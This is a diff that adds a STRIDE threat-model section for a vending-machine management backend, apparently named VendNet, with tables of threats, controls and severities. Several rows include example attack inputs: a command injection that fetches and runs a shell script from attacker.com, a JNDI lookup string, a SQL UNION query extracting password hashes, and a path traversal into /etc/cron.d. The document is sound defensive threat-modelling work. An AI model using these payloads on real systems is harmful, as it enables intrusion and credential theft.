@@ -1,90 +1,475 @@
 # 4. Threat Model — STRIDE Analysis
 
 ## 4.1 Methodology
-<!-- TODO: Describe the STRIDE-per-element approach. Reference Microsoft Threat Modeling Tool or equivalent. -->
+
+This threat model applies the **STRIDE-per-element** methodology, systematically evaluating every element of the Level 1 Data Flow Diagram — external entities, processes, data stores, and data flows — against all six STRIDE threat categories: **S**poofing, **T**ampering, **R**epudiation, **I**nformation Disclosure, **D**enial of Service, and **E**levation of Privilege. For each applicable threat a unique ID (T-XX, sequential across the entire document) is assigned together with a concrete description naming the actual attack, the attack vector, the threat agent, the pre-existing controls derived from the documented architecture (Java 17 / Spring Boot 3.x / MySQL 8.4 / JWT / BCrypt / Spring Security / mTLS / HMAC / AES-256 / ProcessBuilder OS ops / `/var/vendnet/` file system), and a preliminary severity estimate (Critical / High / Medium / Low). Severity is qualitative at this stage; quantitative scoring using the OWASP Risk Rating methodology follows in Section 6. STRIDE categories that are not meaningfully applicable to a given element are marked **No** and omitted from the summary table in §4.3.
+
+---
 
 ## 4.2 STRIDE Analysis per DFD Element
 
 ### 4.2.1 External Entities
 
-#### Customer
+#### E1 — Customer
 
-| STRIDE Category | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent |
-|-----------------|-------------|-----------|-------------------|---------------|-------------|
-| **S**poofing | Yes/No | T-XX | <!-- TODO --> | <!-- TODO --> | <!-- TODO --> |
-| **T**ampering | Yes/No | T-XX | <!-- TODO --> | <!-- TODO --> | <!-- TODO --> |
-| **R**epudiation | Yes/No | T-XX | <!-- TODO --> | <!-- TODO --> | <!-- TODO --> |
-| **I**nformation Disclosure | Yes/No | T-XX | <!-- TODO --> | <!-- TODO --> | <!-- TODO --> |
-| **D**enial of Service | Yes/No | T-XX | <!-- TODO --> | <!-- TODO --> | <!-- TODO --> |
-| **E**levation of Privilege | Yes/No | T-XX | <!-- TODO --> | <!-- TODO --> | <!-- TODO --> |
+| STRIDE | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent | Existing Controls | Severity |
+|--------|:-----------:|-----------|-------------------|---------------|-------------|-------------------|----------|
+| **S**poofing | Yes | T-01 | **Credential stuffing / account takeover**: Attacker authenticates as a legitimate Customer using username-password pairs from external data breaches. | Automated tool submits large volumes of leaked credential pairs against `POST /auth/login` until a match is found. | External attacker | BCrypt password hashing; Spring Security authentication filter | High |
+| **T**ampering | Yes | T-02 | **Purchase request parameter manipulation**: Customer alters the HTTP request body to specify a `unitPrice` or `quantity` value different from the server-side catalog, purchasing at below-catalog cost. | Intercepts or manually crafts `POST /sales` with `{"unitPrice": 0.01}`; submitted over valid TLS session with own JWT. | Malicious customer | HTTPS in transit; server-side catalog price lookup required at processing time | Medium |
+| **R**epudiation | Yes | T-03 | **Purchase repudiation / fraudulent chargeback**: Customer denies having initiated a completed purchase to obtain a refund, claiming the transaction was unauthorised. | Customer contacts support with chargeback claim; absent cryptographic proof of customer-side initiation beyond server records. | Malicious customer | Audit logging of purchase events; immutable `Sale` aggregate (append-only) | Medium |
+| **I**nformation Disclosure | Yes | T-04 | **Horizontal IDOR on purchase history**: Authenticated Customer reads another Customer's purchase history by substituting a different `userId` or `saleId` UUID in the API path. | Calls `GET /customers/{userId}/history` with a UUID belonging to a different user; exploits absent per-resource ownership check. | Malicious customer | JWT-bound user identity; RBAC (`@PreAuthorize`); UUID non-sequential IDs | High |
+| **D**enial of Service | Yes | T-05 | **Login brute-force triggers account lockout against victim**: Attacker floods `POST /auth/login` with incorrect passwords for a known Customer username until `AccountStatus` transitions to `LOCKED`, denying the legitimate user access. | Automated brute-force targeting a known username; account locked after threshold. | External attacker | `AccountStatus.LOCKED` on repeated failures | Medium |
+| **E**levation of Privilege | Yes | T-06 | **JWT role claim tampering to escalate to Administrator**: Attacker who possesses any valid JWT modifies the `role` claim from `CUSTOMER` to `ADMINISTRATOR` and re-signs (or exploits `alg:none`) to access admin-restricted endpoints. | Decode JWT; modify `"role"` payload field; re-sign using recovered or guessed HMAC secret or strip signature. | Malicious customer / external attacker | JWT signature verification in Spring Security; signed with server-held secret | Critical |
 
-#### Operator
-<!-- TODO: Repeat table -->
+---
 
-#### Administrator
-<!-- TODO: Repeat table -->
+#### E2 — Operator
 
-#### Vending Machine (Edge)
-<!-- TODO: Repeat table -->
+| STRIDE | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent | Existing Controls | Severity |
+|--------|:-----------:|-----------|-------------------|---------------|-------------|-------------------|----------|
+| **S**poofing | Yes | T-07 | **Operator credential theft via spear-phishing**: Attacker obtains an Operator's credentials through a targeted phishing campaign and authenticates as that Operator to access machine telemetry, stock data, and issue-reporting endpoints. | Phishing email directs Operator to a fake VendNet login page; captured credentials submitted to the real `POST /auth/login`. | External attacker | BCrypt hashing (protects stored password); HTTPS on login endpoint | High |
+| **T**ampering | Yes | T-08 | **Falsified stock restock submission (phantom inventory)**: Malicious or coerced Operator submits inflated stock quantities for a machine without physically restocking it, creating phantom inventory that disrupts supply-chain operations. | Authenticated Operator calls `PUT /machines/{id}/slots/{n}/stock` with `currentQuantity` set to slot capacity without physical verification. | Malicious insider (Operator) | Audit log records stock update operations; RBAC restricts endpoint to OPERATOR/ADMIN | Medium |
+| **R**epudiation | Yes | T-09 | **Denial of stock update causing inventory discrepancy**: Operator claims they did not submit a stock update that resulted in a machine discrepancy, exploiting a gap in per-request audit attribution. | Operator points to absent or incomplete audit log entry (no slot-level or Operator identity field) to dispute responsibility. | Malicious insider (Operator) | Audit logging tied to JWT identity; per-field completeness not confirmed | Medium |
+| **I**nformation Disclosure | Yes | T-10 | **Cross-machine IDOR — unauthorised telemetry access**: Authenticated Operator reads telemetry and logs for machines outside their assigned fleet by iterating machine UUIDs in the API path. | Calls `GET /machines/{machineId}/telemetry` with a `machineId` not in their assignment; server lacks per-machine Operator-assignment check. | Malicious insider (Operator) | RBAC grants OPERATOR role general telemetry access; per-machine assignment filter not explicitly documented | High |
+| **D**enial of Service | No | — | Operator API footprint does not provide sufficient leverage for system-wide DoS beyond threats covered under P2/P4. | — | — | — | — |
+| **E**levation of Privilege | Yes | T-11 | **Operator calls Administrator-only endpoint via missing `@PreAuthorize`**: Operator exploits a missing or misconfigured Spring Security annotation on an admin-only endpoint (e.g., user management, pricing) to perform Administrator actions. | Authenticated Operator sends `POST /admin/users` or `PUT /products/{id}/price`; endpoint lacks `hasRole('ADMINISTRATOR')` check. | Malicious insider (Operator) | Spring Security `@PreAuthorize(hasRole('ADMINISTRATOR'))`; annotation completeness | High |
 
-#### Payment Gateway
-<!-- TODO: Repeat table -->
+---
+
+#### E3 — Administrator
+
+| STRIDE | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent | Existing Controls | Severity |
+|--------|:-----------:|-----------|-------------------|---------------|-------------|-------------------|----------|
+| **S**poofing | Yes | T-12 | **Administrator account takeover (no MFA documented)**: Attacker compromises Administrator credentials via phishing, password reuse, or brute force and gains unrestricted access to user management, pricing, backups, and security configuration. No multi-factor authentication is specified in the current architecture. | Attacker submits stolen Admin credentials to `POST /auth/login`; receives Admin-scoped JWT. | External attacker / malicious insider | BCrypt hashing; HTTPS | Critical |
+| **T**ampering | Yes | T-13 | **Rogue Administrator reassigns user roles or suspends accounts**: Compromised or malicious Administrator demotes legitimate Administrators to Customer, promotes colluding users to Administrator, or suspends accounts to cover attack tracks. | Admin calls `PUT /users/{id}/role` with manipulated role value; no second-factor approval workflow documented. | Malicious insider (Administrator) | Audit logging of role changes; dual-admin approval not documented | High |
+| **R**epudiation | Yes | T-14 | **Administrator denies initiating pricing change or backup trigger**: Malicious Admin claims they did not execute a specific pricing change or on-demand backup that caused a business or operational incident, exploiting gaps in per-operation audit attribution. | Admin exploits absence of per-command user attribution in audit log to deny responsibility. | Malicious insider (Administrator) | Audit logging; Admin JWT identity bound to HTTP request | Medium |
+| **I**nformation Disclosure | Yes | T-15 | **Mass data exfiltration via compromised Administrator account**: Attacker uses a compromised Admin account to export the full user list, all audit logs, and complete sales history via legitimate API endpoints at high volume. | Calls `GET /users`, `GET /reports/sales`, `GET /logs/audit` in rapid succession; exfiltrates all records over time via a valid Admin session. | External attacker (via compromised Admin account) | RBAC limits access to Admin role; HTTPS; per-session rate limiting not documented | Critical |
+| **D**enial of Service | Yes | T-16 | **Disk exhaustion via repeated on-demand backup generation**: Admin repeatedly triggers on-demand backup generation, filling `/var/vendnet/backups/` and exhausting disk space, causing application-wide file write failures. | Calls `POST /admin/backups` in rapid succession (or via compromised automated account). | Malicious insider / compromised Admin account | 30-day backup rotation policy; concurrent backup job limit not documented | Medium |
+| **E**levation of Privilege | Yes | T-17 | **OS-level command execution via ProcessBuilder abuse from Admin account**: A compromised Admin account triggers the backup process while injecting OS commands through insufficiently sanitised `ProcessBuilder` arguments, escalating from application-level access to OS shell execution. | Admin crafts input to the backup trigger endpoint that escapes into the `ProcessBuilder` argument array (e.g., `; id > /tmp/out`); executes as the application service account. | External attacker (via compromised Admin account) | Admin-only endpoint; `ProcessBuilder` without shell interpreter; argument sanitisation | Critical |
+
+---
+
+#### E4 — Vending Machine
+
+| STRIDE | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent | Existing Controls | Severity |
+|--------|:-----------:|-----------|-------------------|---------------|-------------|-------------------|----------|
+| **S**poofing | Yes | T-18 | **Rogue machine presents stolen mTLS client certificate**: Attacker extracts a valid mTLS client certificate and private key from a physically compromised machine and uses them from remote attacker-controlled infrastructure to authenticate as that machine. | Attacker connects to telemetry/sales endpoints (`EP2`) from a cloud server using the stolen cert/key pair; submits fabricated events as the legitimate machine. | Physical attacker / supply-chain attacker | mTLS mutual authentication; certificate revocation (CRL/OCSP) not documented | High |
+| **T**ampering | Yes | T-19 | **Compromised machine firmware sends falsified sales events**: Compromised VM firmware generates sale records for products never dispensed (or inflates quantities), creating false revenue figures and depleting virtual inventory without physical stock movement. | Firmware calls the sales ingestion endpoint with fabricated `SaleEvent` payloads (valid mTLS authentication; only data accuracy is compromised). | Compromised firmware / supply-chain attacker | mTLS verifies machine identity; business-rule plausibility checks on sale data not documented | High |
+| **R**epudiation | Yes | T-20 | **Machine operator denies erroneous telemetry / sales data origin**: Physical machine operator disputes that the machine sent incorrect stock levels or inflated sales data, claiming the device was externally tampered with after leaving their custody. | Absence of per-telemetry-packet tamper detection (beyond mTLS origin authentication) leaves data-accuracy disputes unresolvable. | Malicious operator / field technician | mTLS certificate tied to machine identity; audit log of received telemetry | Medium |
+| **I**nformation Disclosure | Yes | T-21 | **Compromised machine firmware harvests pushed configuration and price data**: A compromised machine logs all data received on `DF8` (slot assignments, operational parameters, full price lists) to local storage accessible to the attacker. | After mTLS session, firmware writes configuration payload to an attacker-readable partition or exfiltrates over a secondary channel. | Compromised firmware / supply-chain attacker | mTLS encrypts transit; security of config storage on VM device is outside backend scope | Medium |
+| **D**enial of Service | Yes | T-22 | **Compromised machine floods telemetry endpoint with high-frequency requests**: A compromised machine, using its valid mTLS certificate, sends telemetry at pathological frequency, exhausting backend thread capacity or filling the telemetry database. | Firmware modified to send telemetry at 1000 req/s (vs normal 1/min); authenticated requests bypass initial mTLS check; no per-machine rate limit documented. | Compromised firmware | mTLS per-machine authentication; per-machine rate limiting not documented | High |
+| **E**levation of Privilege | Yes | T-23 | **VM uses mTLS certificate to call endpoints beyond telemetry scope**: Compromised machine authenticates to the API using its valid mTLS certificate and calls endpoints outside the telemetry/sales scope (e.g., `GET /users`, `PUT /products/{id}/price`), exploiting absent machine-role restrictions. | VM sends authenticated requests to admin or inventory endpoints; server validates certificate but does not restrict machine identity to `EP2`-scoped operations. | Compromised firmware / external attacker | mTLS certificate authentication; human RBAC roles; machine-specific endpoint scoping not explicitly documented | High |
+
+---
+
+#### E5 — Payment Gateway
+
+| STRIDE | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent | Existing Controls | Severity |
+|--------|:-----------:|-----------|-------------------|---------------|-------------|-------------------|----------|
+| **S**poofing | Yes | T-24 | **Spoofed payment confirmation webhook bypasses HMAC**: Attacker sends a crafted `POST` to callback endpoint `EP3` claiming `PaymentStatus.COMPLETED`, triggering product dispensing without real payment, by exploiting a weak, leaked, or absent HMAC secret. | Attacker identifies the payment callback URL through reconnaissance; crafts payload with valid-looking HMAC (if key is weak or leaked) or exploits a code path that skips HMAC validation. | External attacker | HMAC signature validation on EP3; HMAC key strength and storage not documented | Critical |
+| **T**ampering | Yes | T-25 | **Payment callback payload modification (status FAILED → COMPLETED)**: Network MITM intercepts the confirmation webhook from the Gateway and modifies `"status": "FAILED"` to `"status": "COMPLETED"` before VendNet processes it. | TLS compromise or misconfigured certificate validation on the callback listener allows active interception; HMAC validation is the primary mitigation if it covers the full payload. | External attacker / network-level MITM | HTTPS; HMAC signature validation; full payload coverage of HMAC not confirmed | High |
+| **R**epudiation | Yes | T-26 | **Payment Gateway disputes having sent a confirmation**: Gateway denies having issued a specific confirmation (e.g., due to a retry delivering a duplicate event, or a Gateway-side bug); VendNet has no idempotency record to refute the dispute. | Distributed network retry delivers a duplicate confirmation; Gateway later marks the original transaction as failed; VendNet has already dispensed product. | External system failure / Payment Gateway | HTTPS; payment `transactionRef` field; idempotency key handling not documented | Medium |
+| **I**nformation Disclosure | No | — | Gateway receives only tokenised payment references and transaction amounts (no raw card data per `XP2`); information disclosure risk at the entity level is negligible. | — | — | — | — |
+| **D**enial of Service | Yes | T-27 | **Payment Gateway outage blocks all card/mobile sales**: External processor experiences downtime or throttles VendNet's API key, making it impossible to complete any purchase requiring card or mobile payment. | Gateway-side outage, rate-limit enforcement, or network disruption between VendNet and Gateway. | External system failure / third-party outage | HTTPS retry; circuit-breaker / fallback pattern not documented | High |
+| **E**levation of Privilege | No | — | Payment Gateway is an external system with no application-level RBAC role; it cannot escalate privilege within VendNet. | — | — | — | — |
+
+---
 
 ### 4.2.2 Processes
 
-#### 1.0 Authentication & Authorization
-<!-- TODO: Repeat STRIDE table -->
+#### P1 — Authentication & Authorization
 
-#### 2.0 Inventory Management
-<!-- TODO: Repeat STRIDE table -->
+| STRIDE | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent | Existing Controls | Severity |
+|--------|:-----------:|-----------|-------------------|---------------|-------------|-------------------|----------|
+| **S**poofing | Yes | T-28 | **JWT `alg:none` signature-bypass attack**: Attacker crafts a JWT with `"alg":"none"` in the header, removing the requirement for a valid signature; if the JWT library accepts unsigned tokens, any identity or role can be forged. | Decode any valid JWT; replace header with `{"alg":"none","typ":"JWT"}`; modify payload to desired role/sub; strip signature; submit to any protected endpoint. | External attacker | Spring Security JWT validation; library must explicitly reject `alg:none` | Critical |
+| **S**poofing | Yes | T-29 | **JWT HMAC secret brute-force (weak signing key)**: Attacker captures valid JWTs and runs offline dictionary or brute-force attacks (e.g., `hashcat --hash-type 16500`) to recover the HS256 signing secret, enabling unlimited JWT forgery. | Collect JWTs from intercepted traffic or public endpoints; run offline attack against HMAC-SHA256 secret; success depends on key entropy. | External attacker | JWT signing with server-held secret; key entropy and rotation policy not documented | High |
+| **T**ampering | Yes | T-30 | **JWT payload role-claim tampering after secret recovery**: Having recovered the signing secret (T-29), attacker modifies `"role":"CUSTOMER"` to `"role":"ADMINISTRATOR"` in the payload and issues a valid re-signed token for any user identity. | Exploit T-29 to obtain signing secret; forge arbitrary JWT with elevated role; submit to admin endpoints. | External attacker | JWT signature verification; BCrypt does not protect JWT secret | Critical |
+| **R**epudiation | Yes | T-31 | **Authentication events logged without sufficient context for forensic attribution**: Login successes and failures are not recorded with client IP address, user-agent, and timestamp, preventing investigation of account compromise scope. | Attacker performs large-scale credential stuffing; security team cannot correlate affected accounts because log entries lack IP/UA fields. | External attacker (enabling system-side repudiation) | Audit logging framework present; field completeness of auth events not confirmed | Medium |
+| **I**nformation Disclosure | Yes | T-32 | **Username enumeration via differential login responses**: `POST /auth/login` returns distinct error messages or HTTP status codes for "username not found" vs. "password incorrect", allowing systematic enumeration of registered usernames. | Attacker submits requests with known and unknown usernames; distinct responses identify which usernames are registered; used as precursor to T-01. | External attacker | Spring Security generic error handling; specific implementation not confirmed | Medium |
+| **I**nformation Disclosure | Yes | T-33 | **PII readable in JWT payload (base64, not encrypted)**: The JWT payload contains PII fields (e.g., full email address, full name) that are base64-encoded but not encrypted; any party who obtains the token can read its claims without a cryptographic key. | Token intercepted from URL parameter, `Authorization` header log, or client-side storage; decoded with any base64 decoder. | Malicious customer / external attacker | HTTPS prevents interception in transit; JWT payload encryption (`JWE`) not documented | Low |
+| **D**enial of Service | Yes | T-34 | **BCrypt-amplified brute-force flood exhausts Spring Boot thread pool**: Attacker sends high-concurrency requests to `POST /auth/login`; BCrypt's intentional computational cost (work factor ≥ 10) amplifies CPU consumption per request, allowing a relatively small number of concurrent requests to saturate the Tomcat thread pool. | 50 concurrent threads each submitting login requests; each BCrypt verification consumes ~100ms of CPU; thread pool saturates; legitimate requests queue and timeout. | External attacker | `AccountStatus.LOCKED` (per-account); application-level rate limiting / throttling not documented | High |
+| **E**levation of Privilege | Yes | T-35 | **Revoked JWT remains valid until expiry (no server-side revocation list)**: After an account is suspended (`AccountStatus.SUSPENDED`) or a JWT is revoked following a security incident, the stateless JWT remains cryptographically valid until its `exp` claim, granting continued API access. | Insider whose account was just suspended continues making requests with their unexpired JWT; Spring Security validates the signature but does not re-query account status per request. | Compromised account holder / malicious insider | JWT `exp` claim; live `AccountStatus` check per request not documented | High |
+| **E**levation of Privilege | Yes | T-36 | **Missing method-level `@PreAuthorize` allows direct application-service invocation**: Spring Security annotations applied only at the controller layer; internal callers (scheduled tasks, test endpoints, event listeners) invoke application service methods directly, bypassing HTTP security filter chain role checks. | A scheduled report-generation job calls `UserManagementService.listAllUsers()` internally without passing through the controller's security check; data returned without role validation. | Malicious insider (developer) / misconfiguration | Spring Security controller-level `@PreAuthorize`; `@EnableMethodSecurity` required for method-level enforcement | High |
 
-#### 3.0 Sales Processing
-<!-- TODO: Repeat STRIDE table -->
+---
 
-#### 4.0 Telemetry & Monitoring
-<!-- TODO: Repeat STRIDE table -->
+#### P2 — Inventory Management
 
-#### 5.0 OS Operations
-<!-- TODO: Repeat STRIDE table -->
+| STRIDE | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent | Existing Controls | Severity |
+|--------|:-----------:|-----------|-------------------|---------------|-------------|-------------------|----------|
+| **S**poofing | Yes | T-37 | **Stolen Operator JWT used from unrecognised location outside operational hours**: After credential theft (T-07), attacker uses the Operator's JWT from a different geographic location or device to perform stock manipulation undetected. | Attacker authenticates once with stolen credentials; uses resulting JWT for subsequent inventory operations. | External attacker (with stolen Operator JWT) | RBAC validates role; anomaly detection on JWT usage location/time not documented | Medium |
+| **T**ampering | Yes | T-38 | **IDOR on stock update — modifying inventory for unassigned machine**: Operator calls `PUT /machines/{machineId}/slots/{n}/stock` with a `machineId` belonging to a machine outside their assigned fleet, manipulating inventory they have no authority over. | Authenticated Operator iterates machine UUIDs (harvested from a prior `GET /machines` response); submits updates for machines not in their assignment. | Malicious insider (Operator) | RBAC grants OPERATOR general access; per-machine Operator-assignment enforcement not explicitly documented | High |
+| **T**ampering | Yes | T-39 | **SQL injection via inventory search query parameters**: Unsanitised query parameters in product or machine search endpoints (e.g., `GET /products?name=...`) are interpolated into a Hibernate native SQL query without parameter binding, allowing arbitrary SQL execution. | Submits `name=x' UNION SELECT username,passwordHash,null,null,null FROM users--` via inventory search; if a native query path is used without prepared statements, the injection succeeds. | External attacker / malicious Operator | Spring Data JPA / Hibernate parameterised JPQL for standard queries; native query paths require explicit review | Critical |
+| **R**epudiation | Yes | T-40 | **Stock update audit log entry missing Operator identity and slot detail**: The audit log records the operation type but not the specific Operator's JWT `sub`, the `machineId`, or the `slotNumber` affected, preventing forensic investigation of phantom inventory incidents. | Malicious Operator exploits audit field gap to deny having zeroed a slot's stock before a service outage. | Malicious insider (Operator) | Audit logging present; per-field completeness (who, what machine, what slot, old/new value) not confirmed | Medium |
+| **I**nformation Disclosure | Yes | T-41 | **Full fleet enumeration via unbounded `GET /machines` response**: `GET /machines` returns all registered machines — including GPS coordinates, serial numbers, and slot configurations — to any authenticated Operator without filtering by their assigned fleet. | Authenticated Operator calls `GET /machines` with no filter; receives JSON array of all machines, including location and operational data for machines they do not manage. | Malicious insider (Operator) | RBAC restricts endpoint to OPERATOR/ADMIN; response filtering by Operator-machine assignment not documented | Medium |
+| **D**enial of Service | Yes | T-42 | **Malformed slot data triggers unhandled domain exception**: Operator submits a stock update with values violating domain invariants (e.g., `quantity > SlotCapacity`, negative `slotNumber`) that pass HTTP-layer validation but cause an unhandled exception in the domain layer, leaving a database transaction open. | Automated boundary-value fuzzing of the stock update endpoint; each malformed request causes a 500 response with potential database transaction lock held until timeout. | Malicious Operator / automated fuzzer | Domain invariant validation (`0 ≤ CurrentQuantity ≤ SlotCapacity`); exception handling and transaction rollback completeness not confirmed | Low |
+| **E**levation of Privilege | Yes | T-43 | **Mass-assignment vulnerability enables Operator to modify product pricing**: A permissive JSON DTO deserialisation on an inventory update endpoint accepts an unexpected `price` field from the Operator's request body, silently persisting a pricing change that should be Administrator-only. | Operator crafts `PUT /machines/{id}` request body with `{"slots":[...],"price":0.01}`; if the DTO is not explicitly whitelisted, Spring's Jackson deserialiser binds the field and the service persists the change. | Malicious insider (Operator) | Spring Boot DTO binding; explicit `@JsonIgnoreProperties` / field whitelist required to prevent mass assignment | High |
 
-#### 6.0 Pricing & Configuration
-<!-- TODO: Repeat STRIDE table -->
+---
+
+#### P3 — Sales Processing
+
+| STRIDE | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent | Existing Controls | Severity |
+|--------|:-----------:|-----------|-------------------|---------------|-------------|-------------------|----------|
+| **S**poofing | Yes | T-44 | **JWT replay attack repeats a purchase on behalf of the victim**: Attacker who obtained a valid Customer JWT (e.g., from a compromised device log) replays a prior purchase request after the victim believes their session has ended. | Attacker replays intercepted `POST /sales` with a valid JWT that has not yet expired; purchase recorded against victim's `UserId`. | External attacker | JWT `exp` claim limits validity window; HTTPS prevents interception in transit; replay protection (nonce/idempotency key) not documented | Medium |
+| **T**ampering | Yes | T-45 | **TOCTOU race condition causes overselling (negative stock)**: Two concurrent purchase requests for the same product in the same slot both pass the stock-availability check before either decrement commits, allowing the slot to reach `CurrentQuantity = -1`, violating the domain invariant. | Two clients send `POST /sales` for identical `machineId`/`slotNumber` within microseconds; without pessimistic locking or an atomic decrement, both succeed. | External attacker / coincidental concurrent load | Spring `@Transactional`; database-level transaction isolation; optimistic vs. pessimistic lock choice not documented | High |
+| **T**ampering | Yes | T-46 | **Client-supplied unit price bypasses server-side catalog validation**: If the sales endpoint accepts `unitPrice` from the client request body instead of resolving it from `Product.price` at processing time, an attacker purchases products below catalog cost. | Customer submits `POST /sales` with `{"unitPrice": 0.01, "productId": "..."}` ; if the backend trusts the client-supplied value rather than performing a catalog lookup, the `Sale` record is committed at the manipulated price. | Malicious customer | `UnitPrice` in `Sale` aggregate is a price snapshot — must be fetched server-side; explicit catalog-lookup enforcement at processing time | Critical |
+| **R**epudiation | Yes | T-47 | **Missing payment transaction reference prevents dispute resolution**: A `Sale` record is committed with `PaymentInfo.status = COMPLETED` but `PaymentInfo.transactionRef` is null or not persisted, making it impossible to cross-reference with the Payment Gateway's records during a chargeback dispute. | Customer files chargeback; VendNet cannot present a verifiable external transaction reference to counter the claim; payment processor rules in customer's favour. | Malicious customer | `PaymentInfo` value object contains `transactionRef` field; persistence enforcement and Gateway reference correlation not confirmed | High |
+| **I**nformation Disclosure | Yes | T-48 | **IDOR on `GET /sales/{saleId}` exposes other customers' purchase records**: Any authenticated Customer can retrieve a `Sale` record belonging to another customer by guessing or iterating `SaleId` UUIDs in the API path. | Customer calls `GET /sales/{saleId}` with a UUID from another user's purchase; server returns the record without validating that `sale.userId == requestingUser.id`. | Malicious customer | UUID-based IDs (non-sequential, harder to enumerate); explicit ownership check (`userId` match) required | High |
+| **D**enial of Service | Yes | T-49 | **Purchase flood exhausts Payment Gateway API quota**: Attacker with a valid Customer JWT submits purchase requests at high frequency, triggering outbound payment authorisation calls to the Payment Gateway until the daily quota is exhausted, causing all legitimate sales to fail. | Automated Customer account sends purchase requests at maximum speed; each generates an outbound API call to the Gateway. | External attacker (with valid account) | Authentication required for purchase; per-account rate limiting on purchase endpoint not documented | High |
+| **E**levation of Privilege | Yes | T-50 | **Unauthenticated request reaches sales processing due to missing security filter**: A misconfigured Spring Security filter chain leaves `POST /sales` outside the set of protected paths, allowing anonymous users to initiate purchase transactions without a JWT. | Attacker calls `POST /sales` without an `Authorization` header; request reaches the controller and is processed. | External attacker (anonymous) | Spring Security filter chain; requires explicit `requestMatchers` protecting every sensitive endpoint | Critical |
+
+---
+
+#### P4 — Telemetry & Monitoring
+
+| STRIDE | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent | Existing Controls | Severity |
+|--------|:-----------:|-----------|-------------------|---------------|-------------|-------------------|----------|
+| **S**poofing | Yes | T-51 | **Telemetry packet replay injects stale data as current readings**: Attacker captures a legitimate mTLS-authenticated telemetry packet and replays it multiple times, causing the backend to record outdated stock or status values as the current machine state. | Attacker records `POST /machines/{id}/telemetry` at time T; replays at T+1h; backend records stale `currentQuantity = 0` as the live stock level, triggering unnecessary dispatch. | External attacker / network-level interceptor | mTLS source authentication; timestamp validation / anti-replay nonce not documented | Medium |
+| **T**ampering | Yes | T-52 | **Compromised machine injects false stock-depletion telemetry to force unnecessary restocking**: Compromised VM firmware fabricates telemetry reporting `currentQuantity = 0` for all slots when they are physically full, causing unnecessary Operator dispatch and supply-chain cost. | Firmware sends telemetry endpoint payloads with zeroed quantities; mTLS confirms machine identity but cannot validate data accuracy. | Compromised firmware / supply-chain attacker | mTLS source authentication; plausibility/bounds checks on telemetry data not documented | High |
+| **R**epudiation | Yes | T-53 | **Telemetry ingestion does not record source `MachineId` in audit log**: Received telemetry events are persisted to the telemetry database but the audit log does not associate the record with the originating machine's identity, preventing attribution of falsified telemetry. | After T-52, security investigation cannot determine which machine injected false readings because the audit log records data type but not source machine. | Malicious operator / compromised machine | Telemetry DB stores data; audit log source-attribution completeness not confirmed | Medium |
+| **I**nformation Disclosure | Yes | T-54 | **Telemetry response exposes GPS coordinates and hourly activity patterns**: Telemetry data returned to the OPERATOR role includes precise `Location.latitude`/`Location.longitude` and hourly sales/stock activity patterns, enabling physical targeting of high-value machines. | Authenticated Operator (or attacker with stolen Operator JWT) calls `GET /machines/{id}/telemetry`; response includes full location and activity schedule. | Malicious insider (Operator) / external attacker | RBAC restricts endpoint; data minimisation (stripping sensitive fields for Operator role) not documented | Medium |
+| **D**enial of Service | Yes | T-55 | **Coordinated VM fleet floods telemetry database**: Multiple compromised machines, each with valid mTLS certificates, send telemetry at maximum frequency, filling the telemetry table and causing disk exhaustion or query degradation across the full MySQL instance. | N compromised VMs each send 200 telemetry packets/second; telemetry table grows unboundedly; shared MySQL disk fills, impacting all data stores (Users, Sales, Inventory). | Compromised VM fleet | mTLS per-machine authentication; per-machine telemetry rate limiting and DB-level retention policy not documented | High |
+| **E**levation of Privilege | Yes | T-56 | **Malicious telemetry payload exploits server-side deserialisation vulnerability**: Compromised VM sends a crafted telemetry JSON payload (oversized fields, Unicode escape sequences, injection strings) that triggers a deserialisation vulnerability or expression-language injection in the Spring Boot processing layer. | Firmware sends `{"status":"${jndi:ldap://attacker.com/}","temperature":"A".repeat(10MB)}`; if unsafe deserialisation or unpatched expression-language injection is present, remote code execution results. | Compromised firmware / supply-chain attacker | Java 17 (post-Log4Shell patched); Jackson with explicit type handling; patch currency must be maintained | High |
+
+---
+
+#### P5 — OS Operations
+
+| STRIDE | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent | Existing Controls | Severity |
+|--------|:-----------:|-----------|-------------------|---------------|-------------|-------------------|----------|
+| **S**poofing | Yes | T-57 | **Non-Administrator triggers backup or log rotation via RBAC misconfiguration**: An authenticated Operator or Customer reaches the OS-operations endpoint (e.g., `POST /admin/backups`) because a missing `@PreAuthorize` annotation fails to enforce the Administrator-only requirement. | Authenticated Operator sends `POST /admin/backups`; server executes the backup job under application service account without verifying Administrator role. | Malicious insider (Operator) | Admin-only endpoint via RBAC; `@PreAuthorize(hasRole('ADMINISTRATOR'))` annotation required | High |
+| **T**ampering | Yes | T-58 | **Path traversal via report type parameter escapes `/var/vendnet/` sandbox**: A malicious Administrator (or attacker with Admin access) supplies a crafted report type string containing `../` sequences to create directories or write files outside the intended `/var/vendnet/reports/` subtree. | Admin calls `POST /admin/reports` with `{"reportType":"../../etc/cron.d/vendnet"}`; if the whitelist pattern `^[a-zA-Z0-9_-]+$` is checked before canonicalisation rather than after, a URL-encoded or multi-step traversal bypass succeeds. | Malicious insider (Administrator) / external attacker with Admin access | Whitelist pattern `^[a-zA-Z0-9_-]+$`; `Files.createDirectories()` on validated path; canonicalisation + prefix-assert required as defence in depth | Critical |
+| **T**ampering | Yes | T-59 | **OS command injection via unsanitised `ProcessBuilder` backup parameters**: An input field accepted by the backup trigger endpoint (e.g., a label, timestamp format, or filename prefix) is concatenated into the `ProcessBuilder` command array without sanitisation, injecting shell metacharacters that execute arbitrary OS commands. | Admin calls `POST /admin/backups` with `{"label":"daily; wget http://attacker.com/shell.sh -O /tmp/s && bash /tmp/s"}`; if the label is appended to the argument list rather than treated as a literal argument, the injected commands execute. | Malicious insider (Administrator) / external attacker with Admin access | `ProcessBuilder` without shell interpreter (no `/bin/sh -c`); argument-array construction; input sanitisation completeness not confirmed | Critical |
